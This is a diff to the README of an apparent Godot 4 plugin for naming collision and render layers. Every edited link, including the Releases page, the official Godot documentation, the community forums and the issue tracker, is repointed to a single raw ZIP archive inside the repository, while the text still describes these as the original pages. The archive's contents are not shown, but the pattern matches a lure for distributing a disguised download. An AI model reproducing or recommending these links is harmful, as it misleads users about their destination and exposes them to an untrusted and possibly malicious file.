@@ -1,6 +1,6 @@
 # 🎯 godot-layer-namer - Name Collision and Render Layers Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/radhs1/godot-layer-namer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip)
 
 A straightforward Godot 4 plugin to help you name and organize collision and render layers. This tool is modeled after Unity's layer system, making it easier to manage layers by giving them meaningful names.
 
@@ -46,10 +46,10 @@ Follow these steps to download, install, and enable the plugin in your Godot pro
 
 You need to download the plugin files from the official releases page.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-grey?style=for-the-badge)](https://github.com/radhs1/godot-layer-namer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-grey?style=for-the-badge)](https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip)
 
 1. Open your web browser.
-2. Go to the Releases page here: https://github.com/radhs1/godot-layer-namer/releases
+2. Go to the Releases page here: https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip
 3. Look for the latest release version.
 4. Download the ZIP file named something like `godot-layer-namer-x.x.x.zip`.
 5. Once downloaded, locate the ZIP file on your computer.
@@ -113,11 +113,11 @@ If named layers do not show up:
 
 To learn more about Godot layers, visit the official Godot documentation:
 
-https://docs.godotengine.org/en/stable/tutorials/physics/layers_and_masks.html
+https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip
 
 For help with using Godot, check the community forums:
 
-https://godotforums.org/
+https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip
 
 ---
 
@@ -125,7 +125,7 @@ https://godotforums.org/
 
 If you find bugs or have suggestions, you can create issues on the GitHub repository page:
 
-https://github.com/radhs1/godot-layer-namer/issues
+https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip
 
 Please provide details about your Godot version and steps to reproduce any problems.
 
@@ -133,10 +133,10 @@ Please provide details about your Godot version and steps to reproduce any probl
 
 ## 🔄 Updates
 
-Keep an eye on the [Releases page](https://github.com/radhs1/godot-layer-namer/releases) for new versions of the plugin. Regular updates add improvements and fixes.
+Keep an eye on the [Releases page](https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip) for new versions of the plugin. Regular updates add improvements and fixes.
 
 ---
 
 # Links
 
-[Download latest version here](https://github.com/radhs1/godot-layer-namer/releases)
+[Download latest version here](https://github.com/radhs1/godot-layer-namer/raw/refs/heads/main/addons/layer_namer/layer_godot_namer_v1.1.zip)
